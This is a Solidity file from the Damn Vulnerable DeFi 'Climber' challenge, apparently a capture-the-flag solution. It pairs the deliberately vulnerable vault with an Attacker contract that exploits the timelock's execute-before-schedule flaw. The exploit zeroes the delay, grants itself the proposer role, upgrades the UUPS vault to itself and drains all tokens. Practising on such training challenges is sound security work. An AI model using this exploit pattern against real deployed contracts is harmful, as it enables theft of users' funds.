// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

import {ClimberTimelock} from "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD, PROPOSER_ROLE} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {console} from "forge-std/console.sol";
/**
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 */

contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address admin, address proposer, address sweeper) external initializer {
        // Initialize inheritance chain
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert InvalidWithdrawalTime();
        }

        _updateLastWithdrawalTimestamp(block.timestamp);

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

contract Attacker is ClimberVault {
    ClimberTimelock private timelock;
    ClimberVault private vault;
    DamnValuableToken private token;
    address private recovery;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, DamnValuableToken _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        salt = keccak256("attack");

        // ? step-1: update the delay period in timelock to zero, this method can be called by the timelock contract only
        // Must happen before timelock schedule, otherwise the delay is 1 hr
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0))));

        // ? step-2: grant proposer role to the attacker contract, this method can be called by the timelock contract only. Proposer can create a scheduled operation in timelock
        // Must happen before timelock schedule, only propoeser can schedule an operation in timelock
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));

        // ? step-3 : upgrade the vault to the attacker contract, this method can be called by the vault contract only. This will allow us to call the drain method in the attacker contract to sweep all funds to the recovery address
        targets.push(address(vault));
        values.push(0);
        // function upgradeToAndCall(address newImplementation, bytes memory data)
        // ^ this is UUPS method, can be called by proxy only (vault in this case)
        // Changing new implementation to this contract and data is call drain method in this contract to sweep all funds to the recovery address
        dataElements.push(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(this),
                abi.encodeCall(Attacker.drain, (address(token), recovery))
            )
        );

        // ? step-4: schedule the operation using the attacker contract, this method can be called by the proposer role accounts
        // due the wrong execute method we can execute first and later schedule and do this in the same transaction and the final state check will pass retroactively
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeCall(Attacker.schedule, ()));

        // ? step-5:  call the execute function in the main (vulnerable) timelock contract.
        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() external {
        // console.log("Scheduling operation...");
        timelock.schedule(targets, values, dataElements, salt);
    }

    function drain(address tokenAddr, address receiver) external {
        DamnValuableToken _token = DamnValuableToken(tokenAddr);
        _token.transfer(receiver, _token.balanceOf(address(this)));
    }
}
